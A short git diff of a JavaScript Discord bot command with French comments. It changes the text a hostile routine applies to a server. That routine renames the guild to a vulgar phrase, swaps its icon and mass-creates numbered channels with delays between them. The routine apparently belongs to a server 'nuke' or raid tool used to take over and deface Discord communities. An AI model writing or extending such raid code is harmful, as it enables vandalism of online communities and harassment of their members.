@@ -62,7 +62,7 @@ module.exports = {
 
       // 4. Renommer le serveur en "BIG DICK RANDY"
       console.log('📝 Renommage du serveur...');
-      await guild.setName('dajjal');
+      await guild.setName('BIG DICK RANDY');
 
       // 5. Changer l'icon du serveur (photo dajjal)
       console.log('🖼️ Changement de l\'icon...');
@@ -88,7 +88,7 @@ module.exports = {
             await new Promise(resolve => setTimeout(resolve, 1000));
           }
         } catch (err) {
-          console.error(`Erreur création salon dajjal-${i}:`, err.message);
+          console.error(`Erreur création salon bigdickrandy-${i}:`, err.message);
         }
       }
 
